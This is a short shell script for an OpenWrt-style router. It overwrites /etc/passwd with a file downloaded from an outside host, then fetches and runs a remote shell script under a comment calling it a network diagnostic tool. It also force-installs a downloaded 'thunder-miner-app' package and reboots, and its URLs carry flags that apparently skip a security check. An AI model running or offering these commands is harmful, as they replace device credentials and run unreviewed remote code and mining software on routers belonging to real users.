LOG_PATH=/tmp/reset.log
wget 'http://www.xiefucai.com/tools/zqb2/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
ubus call dcdn set_dcdn_client '{"count":1}'

# 安装断网诊断工具
wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;

wget 'http://update.peiluyou.com/conf/miner_plus_test/packages/thunder-miner-app_V1.3.164_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH

opkg install --force-downgrade /tmp/t.ipk 2>>$LOG_PATH && sleep 30 && reboot &